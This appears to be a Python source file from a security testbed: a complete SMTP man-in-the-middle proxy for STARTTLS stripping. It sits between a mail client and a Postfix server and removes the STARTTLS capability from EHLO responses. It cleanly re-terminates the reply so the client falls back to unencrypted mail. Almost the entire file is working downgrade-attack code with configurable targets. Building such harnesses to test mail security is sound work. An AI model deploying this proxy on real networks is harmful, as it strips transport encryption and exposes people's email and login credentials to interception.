#!/usr/bin/env python3
"""
testbed/mitm/smtp_proxy.py
==========================
Lightweight, protocol-aware SMTP MITM Proxy for STARTTLS Stripping (P0 Special Harness #1).

Architecture:
-------------
Transparent application-layer SMTP proxy sitting on the real traffic path between
the SMTP client and Postfix server:

    SMTP Client (172.28.0.1 / 172.28.0.20)
               ↓
    MITM Proxy (172.28.0.30:25)
               ↓
    Postfix Server (172.28.0.10:25)

Behaviors:
  - Accepts client connections on listen_port (port 25).
  - Establishes connection to upstream Postfix server on upstream_port (port 25).
  - Relays initial 220 banner from server to client.
  - Intercepts client EHLO/HELO command.
  - Receives server multi-line 250 capability response containing 250-STARTTLS.
  - Strips the STARTTLS capability line from the response, re-terminating the
    250 multi-line response cleanly per RFC 5321 §4.2.
  - Relays the stripped response to the client.
  - Continues relaying all subsequent SMTP traffic (e.g. QUIT, MAIL, RCPT, DATA).
  - Cleanly shuts down on connection termination.

RFC Standards:
  - RFC 5321: Simple Mail Transfer Protocol (SMTP)
  - RFC 3207: SMTP Service Extension for Secure SMTP over Transport Layer Security
"""

import argparse
import logging
import socket
import sys
import threading
from typing import List, Tuple

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] [mitm] %(message)s",
)
logger = logging.getLogger("smtp_proxy")


def read_smtp_line(sock: socket.socket) -> str:
    """Read a single CRLF-terminated line from an SMTP socket."""
    buffer = bytearray()
    while True:
        chunk = sock.recv(1)
        if not chunk:
            if buffer:
                break
            raise ConnectionResetError("Connection closed unexpectedly while reading line")
        buffer.extend(chunk)
        if buffer.endswith(b"\r\n") or buffer.endswith(b"\n"):
            break
    return buffer.decode("latin-1")


def read_smtp_response(sock: socket.socket) -> Tuple[int, List[str], bytes]:
    """
    Read a complete single- or multi-line SMTP response per RFC 5321 §4.2.
    Returns (status_code, list_of_lines, raw_bytes).
    """
    lines: List[str] = []
    status_code = 0
    raw = bytearray()

    while True:
        line = read_smtp_line(sock)
        raw.extend(line.encode("latin-1"))
        lines.append(line)
        clean = line.strip()
        if len(clean) >= 3 and clean[:3].isdigit():
            status_code = int(clean[:3])
            # If 4th char is not '-', this is the final line of the response
            if len(clean) == 3 or clean[3] != "-":
                break
        else:
            break

    return status_code, lines, bytes(raw)


def strip_starttls_from_ehlo(lines: List[str]) -> List[str]:
    """
    Protocol-aware STARTTLS capability stripping from an EHLO response (RFC 5321 §4.2 / RFC 3207 §4).
    Filters out any line containing STARTTLS and ensures proper multi-line continuation / termination.
    """
    filtered: List[str] = []
    for line in lines:
        clean = line.strip()
        if len(clean) >= 4 and clean[:3] == "250" and clean[3] in ("-", " "):
            remainder = clean[4:].strip()
            if remainder:
                keyword = remainder.split()[0].upper()
                if keyword == "STARTTLS":
                    logger.info("Stripped STARTTLS capability: %r", clean)
                    continue
        filtered.append(line)

    # Ensure the last line terminates the 250 response with space instead of hyphen
    if filtered:
        last = filtered[-1]
        clean_last = last.strip()
        if len(clean_last) >= 4 and clean_last[:3] == "250" and clean_last[3] == "-":
            filtered[-1] = clean_last[:3] + " " + clean_last[4:] + "\r\n"
            logger.info("Adjusted final line termination: %r", filtered[-1].strip())

    return filtered


def handle_client(
    client_sock: socket.socket,
    client_addr: Tuple[str, int],
    upstream_host: str,
    upstream_port: int,
    strip_mode: bool = True,
) -> None:
    """Handle a single proxied SMTP session."""
    logger.info("Client connected from %s:%d", client_addr[0], client_addr[1])
    server_sock: socket.socket | None = None

    try:
        server_sock = socket.create_connection((upstream_host, upstream_port), timeout=10.0)
        logger.info("Connected to upstream Postfix server at %s:%d", upstream_host, upstream_port)

        # 1. Relay initial greeting from Postfix to Client
        _, greeting_lines, raw_greeting = read_smtp_response(server_sock)
        logger.info("Server greeting: %r", "".join(greeting_lines).strip())
        client_sock.sendall(raw_greeting)

        # 2. Main command/response relay loop
        while True:
            # Read command from client
            try:
                cmd_line = read_smtp_line(client_sock)
            except (ConnectionResetError, EOFError):
                logger.info("Client closed connection")
                break

            if not cmd_line:
                break

            logger.info("Client -> Server: %r", cmd_line.strip())
            cmd_upper = cmd_line.strip().upper()

            # Relay command to upstream server
            server_sock.sendall(cmd_line.encode("latin-1"))

            # Read server response
            status_code, resp_lines, raw_resp = read_smtp_response(server_sock)
            logger.info("Server -> Client (pre-filter): %r", [l.strip() for l in resp_lines])

            # Protocol-aware modification for EHLO / HELO
            if strip_mode and cmd_upper.startswith(("EHLO", "HELO")):
                modified_lines = strip_starttls_from_ehlo(resp_lines)
                logger.info("Server -> Client (post-strip): %r", [l.strip() for l in modified_lines])
                client_sock.sendall("".join(modified_lines).encode("latin-1"))
            else:
                client_sock.sendall(raw_resp)

            # Clean exit on QUIT
            if cmd_upper == "QUIT":
                logger.info("QUIT observed, closing session")
                break

    except Exception as exc:
        logger.error("Proxy error during session: %s", exc)
    finally:
        if server_sock:
            try:
                server_sock.close()
            except Exception:
                pass
        try:
            client_sock.close()
        except Exception:
            pass
        logger.info("Session with %s:%d closed", client_addr[0], client_addr[1])


def run_proxy(
    listen_host: str,
    listen_port: int,
    upstream_host: str,
    upstream_port: int,
    strip_mode: bool = True,
    single_session: bool = False,
) -> None:
    """Run the proxy listener loop."""
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((listen_host, listen_port))
    listener.listen(5)
    logger.info("SMTP MITM Proxy listening on %s:%d -> forwarding to %s:%d (strip_starttls=%s)",
                listen_host, listen_port, upstream_host, upstream_port, strip_mode)

    try:
        while True:
            client_sock, client_addr = listener.accept()
            if single_session:
                handle_client(client_sock, client_addr, upstream_host, upstream_port, strip_mode)
                break
            else:
                t = threading.Thread(
                    target=handle_client,
                    args=(client_sock, client_addr, upstream_host, upstream_port, strip_mode),
                    daemon=True,
                )
                t.start()
    except KeyboardInterrupt:
        logger.info("Proxy interrupted by keyboard")
    finally:
        listener.close()
        logger.info("Proxy listener stopped")


def main() -> None:
    parser = argparse.ArgumentParser(description="SMTP STARTTLS Stripping MITM Proxy")
    parser.add_argument("--listen-host", default="0.0.0.0", help="Address to listen on")
    parser.add_argument("--listen-port", type=int, default=25, help="Port to listen on")
    parser.add_argument("--upstream-host", default="172.28.0.10", help="Upstream Postfix server host")
    parser.add_argument("--upstream-port", type=int, default=25, help="Upstream Postfix server port")
    parser.add_argument("--no-strip", action="store_true", help="Disable STARTTLS stripping (pass-through mode)")
    parser.add_argument("--single-session", action="store_true", help="Exit after serving a single session")
    args = parser.parse_args()

    run_proxy(
        listen_host=args.listen_host,
        listen_port=args.listen_port,
        upstream_host=args.upstream_host,
        upstream_port=args.upstream_port,
        strip_mode=not args.no_strip,
        single_session=args.single_session,
    )


if __name__ == "__main__":
    main()
